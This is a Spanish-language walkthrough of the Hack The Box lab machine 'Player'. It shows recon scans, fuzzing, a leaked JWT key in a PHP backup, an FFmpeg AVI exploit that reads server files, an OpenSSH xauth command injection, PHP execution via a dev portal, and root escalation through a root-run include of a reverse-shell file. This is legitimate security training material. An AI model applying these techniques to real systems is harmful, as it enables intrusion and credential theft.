# Machine-HTB-Player

```
mkdir PlayerHTB

```


## Nmap 

```

Host is up, received echo-reply ttl 63 (0.10s latency).
Scanned at 2023-03-07 14:16:19 EST for 11s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d730dbb9a04c79947838b343a2505581 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBANqJ2hnodPLniUfs3D+0FqejPLtrrETr9KOAejyFyq/qnLxmRTBcfgaMiLveU98x2vtJkOOhCMMh7c2tDg85fNFLufeScarVh8ZInsPGYTMZXtfW1V3Y3AITMhpjasRH1BM5d8mq5hiE+7DzjDNnhXpS/1SWyYRFQLaUZw7Ln/PVAAAAFQDeL6S1B7qnINkqIsVtN0VrdG/jJQAAAIBhmvL/NguMRBB8rvYanIRkHRGM2fRpue25mSMH0Ffp+zYiVdFSlpeK6WyAS0UsD6kZTI9pgXtVZpk0UOuqsXVlpfbl77e6sD2iRTgXA4/bUJBU+0ebFZXgPf4EYl/eekcFRjNSAA2hBoQzaOxQ0KV/AlsxLEjkyzwhgOOHtw9RHAAAAIEAyWUEkRktKq2UAqdzcw3lSOsMtDM6iBTtPw0OhtwPW4PS8NoJu04xVCHsOizPmsZBi/AmnqXegMB1eFpsgQHnd14Pa3J+5qAays+x0EJoR1LRjESt4gzhNqS0KNdDdWxF09uwWnH0ENHj7AelCiqpCErbBRSNgKewdLb8apqqJsc=
|   2048 372be431eea6490d9fe7e601e63e0a66 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHqTWXCjHaTNd1UMgEe+cXsfpjHQZR22ch30CbgzFJb7+mN6Lz2YOBweGD8ygL+0nSKVREuzcNoqSH3LPuyEIW9gQIe5ax2qXS525s2N68CRN4okpH9RI3MHc7bpd7T7qYs9XhfIsJOeWMt3EIlrruRRJOAwGr9vYVlWt1nkGibVuJ95RbGytHp1vuMNKgNlzVG04KDe6bQ7w7ft74bQtgS2U+rQe5AR4fn+B193SEnb2OYoTsVtyRO9BDszKxDEODiK4/E2yjvCfLNIFRbYr1ep9CAuBdcUYoxS5vtP4XC6a4BFsdfdIQ0Uksaa/d5gu81XZJoNKNnXllfFO2WXJj
|   256 0c6c05edadf175e802e4d2273e3a198f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNRxN8vUONwGvkJGeMbMQ9v9SfPsYBhrjHTY0Nn+EOhyGgdfOKNkbglA8mXlPiTtF2Q6r99yhRzWLv4IHexegR0=
|   256 11b8dbf3cc29084a49cebf917340a280 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJEXOd3zpYOhdHN49fw2QUqR33HT5ZD2O2w0L6IEMIES
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.7
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.7 (Ubuntu)
6686/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar  7 14:16:30 2023 -- 1 IP address (1 host up) scanned in 11.57 seconds
                                                                                                  


```

## Vhosting

```
ffuf -fc 400,404,403 -t 1000 -w  /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://player.htb/ -H "Host: FUZZ.player.htb"
wfuzz -c --hc=404,403 -t 1000 -w /opt/SecLists/Discovery/DNS/shubs-subdomains.txt  -H "Host: FUZZ.player.htb"  http://player.htb

```

![image](https://user-images.githubusercontent.com/63270579/223590512-5e2949c1-c648-4fa3-9202-f40bb62c474b.png)

![image](https://user-images.githubusercontent.com/63270579/223591508-fc67bab0-c8eb-4820-8aa8-a38eb3a98b35.png)


### chat.player.htb

![image](https://user-images.githubusercontent.com/63270579/223592582-a2371cc9-f1af-4a0e-a611-7a9d542f5080.png)




### dev.player.htb

![image](https://user-images.githubusercontent.com/63270579/223761179-dc5d5bd6-1f65-4663-91c8-d2be71a6b3a1.png)

### POST 

```
POST /components/user/controller.php?action=authenticate
username=test&password=Password&theme=default&language=en
```


### staging.player.htb


```
[Status: 200, Size: 818, Words: 190, Lines: 45, Duration: 226ms]
    * FUZZ: contact.php

[Status: 200, Size: 1642, Words: 171, Lines: 88, Duration: 229ms]
    * FUZZ: update.php

[Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 107ms]
    * FUZZ: fix.php

```

### Se encontro una cabecera extraña

la cual contiene algunas rutas antes de redirigir a 501.php

```
GET /contact.php?firstname=masa&subject=aaaa 



array(3) {
  [0]=>
  array(4) {
    ["file"]=>
    string(28) "/var/www/staging/contact.php"
    ["line"]=>
    int(6)
    ["function"]=>
    string(1) "c"
    ["args"]=>
    array(1) {
      [0]=>
      &string(9) "Cleveland"
    }
  }
  [1]=>
  array(4) {
    ["file"]=>
    string(28) "/var/www/staging/contact.php"
    ["line"]=>
    int(3)
    ["function"]=>
    string(1) "b"
    ["args"]=>
    array(1) {
      [0]=>
      &string(5) "Glenn"
    }
  }
  [2]=>
  array(4) {
    ["file"]=>
    string(28) "/var/www/staging/contact.php"
    ["line"]=>
    int(11)
    ["function"]=>
    string(1) "a"
    ["args"]=>
    array(1) {
      [0]=>
      &string(5) "Peter"
    }
  }
}
Database connection failed.<html><br />Unknown variable user in /var/www/backup/service_config fatal error in /var/www/staging/fix.php


```


### player.htb

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://player.htb/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/directory-list-1.0.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 1000
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response words: 175
 :: Filter           : Response status: 404,403
________________________________________________

[Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 104ms]
    * FUZZ: launcher


```

Te das cuenta que existe una diferencia en el .php cuand o mandas el correo

```
/launcher/dee8dc8a47256c64630d803a4c40786e.php
/launcher/dee8dc8a47256c64630d803a4c40786c.php?

```



### Backups

Si en el chat dice que se tienen archivos expuestos pues buscamos backups que se quedon por ahi.

```
bfac -u http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php
----------------------------------------------------------------------
                 _____ _____ _____ _____
                | __  |   __|  _  |     |
                | __ -|   __|     |   --|
                |_____|__|  |__|__|_____|

           -:::Backup File Artifacts Checker:::-
                     Version: 1.4
  Advanced Backup-File Artifacts Testing for Web-Applications
Author: Mazin Ahmed | <mazin AT mazinahmed DOT net> | @mazen160
----------------------------------------------------------------------


[i] URL: http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php
[$] Discovered: -> {http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php~} (Response-Code: 200 | Content-Length: 742)
                                                                                                 
[i] Findings:
http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php~ (200) | (Content-Length: 742)

[i] Finished performing scan.

```

### De /launcher/dee8dc8a47256c64630d803a4c40786c.php~

Entonces aqui solo une las piezas si ese codigo es ese pues te redireccion Location: es igual a redireccion. si no setea una nueva Cookie. Ahora si tenemos el password y el codigo podriamos generar una cookie que al decifrar nos llevara a la pagina de location pues justo eso se hizo.

```
php
require 'vendor/autoload.php';

use \Firebase\JWT\JWT;

if(isset($_COOKIE["access"]))
{
	$key = '_S0_R@nd0m_P@ss_';
	$decoded = JWT::decode($_COOKIE["access"], base64_decode(strtr($key, '-_', '+/')), ['HS256']);
	if($decoded->access_code === "0E76658526655756207688271159624026011393")
	{
		header("Location: 7F2xxxxxxxxxxxxx/");
	}
	else
	{
		header("Location: index.html");
	}
}
else
{
	$token_payload = [
	  'project' => 'PlayBuff',
	  'access_code' => 'C0B137FE2D792459F26FF763CCE44574A5B5AB03'
	];
	$key = '_S0_R@nd0m_P@ss_';
	$jwt = JWT::encode($token_payload, base64_decode(strtr($key, '-_', '+/')), 'HS256');
	$cookiename = 'access';
	setcookie('access',$jwt, time() + (86400 * 30), "/");
	header("Location: index.html");
}

?>
```



### JSON WEB Token 

Nos damos cuenta al decodificar base64 que se trata de un jwt lo que hacemos es ir a la pagina

> https://jwt.io/

Hasta aqui no podemos hacer nada porque el jwt es como un hmac

![image](https://user-images.githubusercontent.com/63270579/223812451-9cf2e9a7-3d4c-4f5f-866d-d379d5737062.png)



## http://player.htb/launcher/7F2dcsSdZo6nj3SNMTQ1/ (Subida de archivos)

Se intenta subir direfentes archivos como dice media pues subimos algo de video 

![image](https://user-images.githubusercontent.com/63270579/223825812-635336b9-7dee-4158-96e2-d6004650a30f.png)


```
file 656636429.avi 

656636429.avi: RIFF (little-endian) data, AVI, 300 x 168, 25.00 fps, video: FFMpeg MPEG-4

```

Buscamos en google "FFMpeg"

> FFmpeg es una colección de software libre que puede grabar, convertir y hacer streaming de audio y vídeo. Incluye libavcodec, una biblioteca de códecs. FFmpeg está desarrollado en GNU/Linux, pero puede ser compilado en la mayoría de los sistemas operativos, incluyendo Windows.

# Buscar exploits

"FFMpeg github exploit"

> https://github.com/cujanovic/SSRF-Testing/blob/master/ffmpeg/gen_avi.py

Entonces podemos leer archivos del servidor.

```
gen_avi.py file://var/www/backup/service_config videoout.avi

```

El video de ese archivo nos deja ver:

![image](https://user-images.githubusercontent.com/63270579/224101508-f29356b9-b4b5-445a-9dce-a17441b0dbd8.png)

Vamos a intentar ingresar con esas credenciales en ambos servicios.

```
telegen / d-bC|jC!2uepS/w

```

# Primer acceso a la maquina

Se obtuvo acceso mediante telegen en el puerto 6686 pero si vemos tiene una lshell buscamos en google 


> Si se desea que un usuario pueda entrar en un sistema por SSH y que tenga una shell limitada, lShell es la solución

Entonces necesitamos otra estrategia.

>  para escapar y a pesar de consultar el contenido de /etc/lshell.conf a través del exploit FFMpeg para buscar un punto débil a dicha shell no encontramos nada para poder avanzar por este camino.

## OpenSSH 7.2p1 - (Authenticated) xauth Command Injection

Sabemos que el OpenSSH vercion 7 es vulnerable

![image](https://user-images.githubusercontent.com/63270579/224112359-c3f287a8-ef1c-4da2-946e-ee1dbf910b38.png)

obtenemos credenciales 

```
//peter
//CQXpm\z)G5D#%S$y=
```

### dev.player.htb

Con las credenciales de peter accedemos al portal y vemos que se puede crear un proyecto nuevo quiza podemos ejecutar comandos de algun modo.

La ruta que nos permite escribir es /var/www/demo/home

```
/var/www/demo/home/masa

```
Y aqui intentamos creer un nuevo archivo .php

```
<?php phpinfo(); ?>

```
Vemos que esta interpretando codigo php 

![image](https://user-images.githubusercontent.com/63270579/224190810-c0cbe450-428a-4b1e-b775-10c59b811081.png)

## Fully TTY

```
script /dev/null -c bash
ctrl+Z
stty raw -echo
fg
[1]  + continued  nc -lvnp 1234 (output)
                                       reset
xterm
export TERM=xterm
export SHELL=bash
stty -a # Para ver el tamaño de las filas y columnas
stty rows 38 columns 167
```

## pspy64

![image](https://user-images.githubusercontent.com/63270579/224194236-7f7b9908-82ed-452d-8624-17fdf6ad7958.png)


Para ver los procesos que corren incluso con permisos de root.

```
/var/lib/playbuff/buff.php
```

encontramos que ese archivo incluye esto.

> include("/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php");

Como el buff.php se ejecuta comno root todo lo que ejecute sera en el contexto de root por lo tanto si incluimos un archivo shell reversa lo ejecutara

![image](https://user-images.githubusercontent.com/63270579/224199245-e183d535-1c2b-499a-a951-4cccb2324e5b.png)




























































































































































